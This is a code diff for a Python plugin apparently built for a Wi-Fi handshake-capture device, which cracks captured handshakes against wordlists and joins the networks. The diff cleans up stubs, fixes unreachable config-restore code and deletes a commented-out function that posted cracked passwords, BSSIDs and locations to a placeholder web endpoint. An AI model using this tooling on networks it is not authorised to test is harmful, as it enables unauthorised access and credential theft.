@@ -24,9 +24,6 @@ class dangerwillrobinson(plugins.Plugin):
         self.wpasup_folder = "/root/wpasupplicants/"
         self.whitelist = ['']
 
-    def on_internet_available(self):
-        pass
-
     def on_handshake(self, agent, filename, access_point, client_station):
         todelete = 0
         handshakeFound = 0
@@ -121,9 +118,6 @@ class dangerwillrobinson(plugins.Plugin):
         logging.info('[DWR] No key found in any wordlist.')
         return None
 
-    def on_epoch(self):
-        pass
-
     def on_unfiltered_ap_list(self, agent, access_points):
         selected_index = 0
         while selected_index < len(access_points):
@@ -194,24 +188,10 @@ class dangerwillrobinson(plugins.Plugin):
         output = result.stdout
         ip_address = re.search(r'bound to ([\d.]+)', output)
         if ip_address:
-            return ip_address.group(1)
             subprocess.run(['mv', '/etc/wpa_supplicant/wpa_supplicant.conf.bak', '/etc/wpa_supplicant/wpa_supplicant.conf'])
+            return ip_address.group(1)
         else:
             return None
-
-    # def update_webpage(self, network_name, bssid, password):
-    #     url = 'http://your-webpage-url/update'
-    #     data = {
-    #         'network_name': network_name,
-    #         'bssid': bssid,
-    #         'password': password,
-    #         'location': 'your-location-data'
-    #     }
-    #     response = requests.post(url, json=data)
-    #     if response.status_code == 200:
-    #         logging.info("[DWR] Webpage updated successfully.")
-    #     else:
-    #         logging.warning("[DWR] Failed to update webpage.")
 
     def get_password_lng_lat(self, ssid, bssid):
         dwr_file = '/root/.dwr'
